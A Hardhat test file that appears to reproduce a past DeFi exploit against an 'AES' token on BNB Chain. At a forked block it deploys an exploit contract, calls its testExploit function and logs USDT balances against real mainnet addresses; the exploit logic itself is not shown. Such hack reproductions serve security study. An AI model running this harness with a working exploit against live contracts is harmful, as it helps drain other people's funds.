import { ethers } from 'hardhat'
import { expect } from 'chai'
import { IERC20, Aes } from '../typechain-types'
import { SignerWithAddress } from '@nomicfoundation/hardhat-ethers/signers'

describe('AES Exploit Test', function () {
    let aesContract: Aes // The contract instance of the exploit contract
    let USDT: IERC20 // The contract instance of USDT
    let deployer: SignerWithAddress // The account deploying the contract
    let dodo: string = '0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A' // DODO address as specified in the contract

    before(async function () {
        ;[deployer] = await ethers.getSigners()

        // Deploy the AES contract
        const AesExploit = await ethers.getContractFactory('Aes')
        aesContract = await AesExploit.deploy()

        // Assuming USDT is already deployed, get the contract instance
        USDT = await ethers.getContractAt('IERC20', '0x55d398326f99059fF775485246999027B3197955')
    })

    it('should block number equal to 23695904', async function () {
        const blockNumber = await ethers.provider.getBlockNumber()
        expect(blockNumber).to.equal(23695904)
    })

    it('should show USDT balance change of Aes contract after exploit', async function () {
        // Log initial USDT balance of the Aes contract and DODO
        const initialBalanceAesContract = await USDT.balanceOf(aesContract.getAddress())
        const initialBalanceDodo = await USDT.balanceOf(dodo)
        console.log(`Initial USDT Balance of Aes Contract: ${initialBalanceAesContract.toString()}`)

        // Trigger the exploit
        await aesContract.testExploit()

        // Log USDT balance after the exploit
        const finalBalanceAesContract = await USDT.balanceOf(aesContract.getAddress())
        const finalBalanceDodo = await USDT.balanceOf(dodo)
        console.log(`Final USDT Balance of Aes Contract: ${finalBalanceAesContract.toString()}`)
    })
})
